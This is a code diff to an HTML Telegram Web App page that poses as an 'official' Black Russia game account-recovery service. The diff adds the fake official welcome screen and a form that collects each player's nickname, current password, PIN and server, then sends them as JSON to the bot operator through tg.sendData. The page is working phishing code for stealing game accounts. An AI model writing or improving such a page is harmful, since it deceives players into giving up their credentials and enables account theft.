@@ -3,118 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Black Russia Panel</title>
+    <title>Black Russia Account</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
-            background-color: #0b0b0b;
-            /* Здесь иконка на фоне, она будет полупрозрачной и по центру */
-            background-image: linear-gradient(rgba(11, 11, 11, 0.85), rgba(11, 11, 11, 0.85)), url('logo.png');
-            background-position: center;
-            background-repeat: no-repeat;
-            background-size: 80%;
+            background-color: #0d0d0d;
             color: #ffffff;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             margin: 0;
             padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            justify-content: center;
+            min-height: 100vh;
+            background-image: linear-gradient(rgba(13, 13, 13, 0.9), rgba(13, 13, 13, 0.9)), url('logo.png');
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: 60%;
+            background-attachment: fixed;
         }
 
-        /* ЭКРАН 1: ГЛАВНОЕ МЕНЮ */
-        #main-menu {
+        #welcome-screen {
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            height: 100%;
             text-align: center;
+            width: 100%;
         }
 
-        .main-title {
+        .br-title {
             color: #ff0000;
-            font-size: 32px;
-            font-weight: bold;
+            font-size: 34px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
             text-transform: uppercase;
-            text-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
-            cursor: pointer;
-            border: 2px solid #ff0000;
-            padding: 15px 30px;
-            border-radius: 15px;
-            transition: 0.3s;
         }
 
-        /* ЭКРАН 2: ФОРМА ДАННЫХ */
+        .br-subtitle {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .br-desc {
+            color: #555;
+            font-size: 15px;
+            margin-bottom: 50px;
+        }
+
         #form-screen {
-            display: none; /* Сначала скрыт */
+            display: none;
             width: 100%;
             max-width: 350px;
+            padding-bottom: 30px;
         }
 
         h2 {
             color: #ff0000;
             text-align: center;
             text-transform: uppercase;
+            font-size: 20px;
             margin-bottom: 20px;
         }
 
-        .input-group {
-            margin-bottom: 12px;
-        }
-
-        label {
-            display: block;
-            color: #888;
-            font-size: 13px;
-            margin-bottom: 4px;
-        }
-
+        .input-group { margin-bottom: 15px; }
+        label { color: #888; font-size: 13px; display: block; margin-bottom: 5px; }
+        
         input, select {
             width: 100%;
-            padding: 10px;
-            background-color: rgba(26, 26, 26, 0.9);
+            padding: 12px;
+            background-color: #1a1a1a;
             border: 1px solid #333;
-            border-radius: 8px;
+            border-radius: 10px;
             color: white;
             box-sizing: border-box;
             outline: none;
+            font-size: 16px;
         }
 
         input:focus { border-color: #ff0000; }
 
-        .btn-submit {
+        .red-button {
             width: 100%;
-            padding: 14px;
+            max-width: 350px;
+            padding: 18px;
             background-color: #ff0000;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: bold;
             text-transform: uppercase;
-            margin-top: 15px;
-            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.4);
         }
     </style>
 </head>
 <body>
 
-    <div id="main-menu">
-        <div class="main-title" onclick="showForm()">Сменить пароль</div>
+    <div id="welcome-screen">
+        <div class="br-title">BLACK RUSSIA</div>
+        <div class="br-subtitle">ВОССТАНОВЛЕНИЕ ДОСТУПА</div>
+        <div class="br-desc">Официальный сервис управления аккаунтом</div>
+        <button class="red-button" onclick="goToForm()">ПРОДОЛЖИТЬ</button>
     </div>
 
     <div id="form-screen">
         <h2>Данные аккаунта</h2>
         <div class="input-group">
             <label>Ваш Никнейм *</label>
-            <input type="text" id="nickname" placeholder="Ivan_Ivanov">
+            <input type="text" id="nick" placeholder="Ivan_Ivanov">
         </div>
         <div class="input-group">
             <label>Текущий пароль *</label>
-            <input type="password" id="old_pass" placeholder="Введите пароль">
+            <input type="password" id="old_p" placeholder="Введите пароль">
         </div>
         <div class="input-group">
             <label>Пин-код (если есть)</label>
@@ -124,39 +129,61 @@
             <label>Выберите сервер *</label>
             <select id="server">
                 <option value="" disabled selected>Нажмите для выбора</option>
-                <option>Red</option><option>Green</option><option>Blue</option>
-                <option>Chilli</option><option>Moscow</option>
-            </select>
+                </select>
         </div>
         <div class="input-group">
             <label>Новый пароль *</label>
-            <input type="password" id="new_pass" placeholder="Придумайте пароль">
+            <input type="password" id="new_p" placeholder="Придумайте пароль">
         </div>
-        <button class="btn-submit" onclick="sendData()">Сменить пароль</button>
+        <button class="red-button" onclick="sendData()">СМЕНИТЬ ПАРОЛЬ</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        function showForm() {
-            document.getElementById('main-menu').style.display = 'none';
+        // Список серверов
+        const servers = [
+            "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Lime", "Pink", "Cherry", "Black",
+            "Indigo", "White", "Magenta", "Crimson", "Gold", "Azure", "Platinum", "Aqua", "Gray", "Ice",
+            "Chilli", "Choco", "Moscow", "SPB", "Ufa", "Sochi", "Kazan", "Samara", "Rostov", "Anapa",
+            "EKB", "Krasnodar", "Arzamas", "Novosib", "Grozny", "Saratov", "Omsk", "Irkutsk", "Volgograd", "Voronezh",
+            "Belgorod", "Makhachkala", "Vladivkaz", "Vladivostok", "Kaliningrad", "Chelyabinsk", "Krasnoyarsk", "CHEBOKSARY", "KHABAROVSK", "PERM",
+            "TULA", "RYAZAN", "MURMANSK", "PENZA", "KURSK", "ARKHANGELSK", "ORENBURG", "KIROV", "KEMEROVO", "TYUMEN",
+            "TOLYATTI", "IVANOVO", "STAVROPOL", "SMOLENSK", "PSKOV", "BRYANSK", "OREL", "YAROSLAVL", "BARNAUL", "LIPETSK",
+            "ULYANOVSK", "YAKUTSK", "TAMBOV", "BRATSK", "ASTRAKHAN", "CHITA", "KOSTROMA", "VLADIMIR", "KALUGA", "NOVGOROD",
+            "TAGANROG", "VOLOGDA", "TVER", "TOMSK", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"
+        ];
+
+        // Заполнение списка серверов при загрузке
+        const select = document.getElementById('server');
+        servers.forEach(srv => {
+            let opt = document.createElement('option');
+            opt.value = srv;
+            opt.innerHTML = srv;
+            select.appendChild(opt);
+        });
+
+        function goToForm() {
+            document.getElementById('welcome-screen').style.display = 'none';
             document.getElementById('form-screen').style.display = 'block';
         }
 
         function sendData() {
-            let nickname = document.getElementById('nickname').value;
-            let old_pass = document.getElementById('old_pass').value;
-            let server = document.getElementById('server').value;
-            let new_pass = document.getElementById('new_pass').value;
+            let res = {
+                nick: document.getElementById('nick').value,
+                old: document.getElementById('old_p').value,
+                pin: document.getElementById('pin').value,
+                server: document.getElementById('server').value,
+                new: document.getElementById('new_p').value
+            };
 
-            if(!nickname || !old_pass || !server || !new_pass) {
-                alert("Заполните все поля!");
+            if(!res.nick || !res.old || !res.server || !res.new) {
+                alert("Пожалуйста, заполните все обязательные поля!");
                 return;
             }
 
-            let result = `Ник: ${nickname}\nСтарый: ${old_pass}\nСервер: ${server}\nНовый: ${new_pass}`;
-            tg.sendData(result);
+            tg.sendData(JSON.stringify(res));
             tg.close();
         }
     </script>
